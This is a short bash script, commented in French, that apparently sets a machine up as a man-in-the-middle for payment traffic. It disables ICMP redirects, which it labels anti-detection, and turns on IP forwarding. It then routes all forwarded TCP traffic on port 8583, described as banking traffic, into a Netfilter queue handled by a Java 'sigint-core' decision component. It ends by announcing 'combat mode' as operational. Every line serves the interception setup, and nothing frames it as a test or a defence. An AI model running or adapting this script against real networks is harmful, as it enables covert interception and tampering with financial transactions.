#!/bin/bash
# Activation des privilèges de routage et des files d'attente

echo "[1/3] Configuration du noyau (Anti-detection)..."
sysctl -w net.ipv4.conf.all.send_redirects=0
sysctl -w net.ipv4.ip_forward=1

echo "[2/3] Configuration de la file d'attente Netfilter..."
# Force tout le trafic bancaire (port 8583) vers la queue numéro 1
iptables -A FORWARD -p tcp --dport 8583 -j NFQUEUE --queue-num 1

echo "[3/3] Lancement du pont décisionnel Kotlin..."
java -jar build/libs/sigint-core-all.jar &

echo "🚀 SYSTÈME EN MODE COMBAT OPÉRATIONNEL"
